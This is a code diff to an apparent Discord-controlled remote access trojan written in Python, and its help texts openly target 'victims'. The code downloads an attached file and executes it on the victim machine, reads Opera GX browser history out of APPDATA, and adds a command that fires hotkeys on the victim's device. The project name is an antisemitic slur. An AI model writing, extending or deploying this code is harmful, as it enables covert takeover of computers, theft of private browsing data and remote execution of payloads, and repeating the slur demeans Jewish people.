@@ -37,7 +37,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3"  # Replace with current jewfuss version (not required just something you can change if you want to keep track of version) - 25c75g
+version = "1.0.3.1"  # Replace with current jewfuss version (not required just something you can change if you want to keep track of version) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -62,10 +62,9 @@ async def update(ctx):
     try:
         save_path = os.path.join(os.path.dirname(sys.argv[0]), attachment.filename)
         await attachment.save(save_path)
-        await ctx.send(f"Updater `{attachment.filename}` has been downloaded.")
         
         subprocess.Popen([save_path, "--updater"], shell=True)
-        await ctx.send(f"Updater `{attachment.filename}` has been executed.")
+        await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
     except Exception as e:
         await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
 
@@ -934,12 +933,11 @@ async def gethistory(ctx, max_force_profiles: int = 10):
         return output.getvalue().encode("utf-8") if found else None, None
 
     async def extract_opera_history():
+        base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
+        history_path = os.path.join(base, "History")
+        if not os.path.exists(history_path):
+            return None, "Opera GX"
         try:
-            base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
-            history_path = os.path.join(base, "History")
-            if not os.path.exists(history_path):
-                return None, "Opera GX"
-
             output = io.StringIO()
             epoch_start = datetime.datetime(1601, 1, 1)
             min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
@@ -1027,6 +1025,18 @@ async def rclick(ctx):
         await ctx.send("Right click executed successfully.")
     except Exception as e:
         await ctx.send(f"Error executing right click: {str(e)}")
+
+@bot.command(help="Triggers a pyautogui hotkey on victims device seperated by spaces. Available keys: https://bit.ly/3ya6vKg.")
+async def hotkey(ctx, *, keys=None):
+    if not keys:
+        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
+        return
+
+    try:
+        pyautogui.hotkey(*keys.split())
+        await ctx.send(f"Pressed hotkey: `{keys}`")
+    except Exception as e:
+        await ctx.send(f"Error: `{e}`")
 
 @bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
 async def key(ctx, func: str = "", value: str = ""):
